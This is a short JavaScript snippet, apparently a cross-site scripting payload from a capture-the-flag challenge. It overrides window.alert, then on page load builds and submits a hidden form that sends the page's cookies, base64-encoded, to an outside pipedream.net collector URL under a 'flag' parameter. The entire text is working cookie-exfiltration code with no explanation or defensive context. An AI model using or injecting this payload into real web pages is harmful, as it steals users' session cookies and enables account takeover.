window.alert = function () {
    console.log("alert(1337)")
};
window.document.onload = () =>{
    var link = document.createElement("a");
    var link_final = "https://eoctl0knzoys9l9.m.pipedream.net/?flag=" + btoa(document.cookie)
    var form = document.createElement("form");
    form.setAttribute("action", link_final);
    form.setAttribute("method", "get");
    form.setAttribute("class", "form_");
    form.setAttribute("target", "send_flag");
    document.body.appendChild(form);
    w = window.open("", "send_flag")
    document.querySelector('.form_').submit();
}
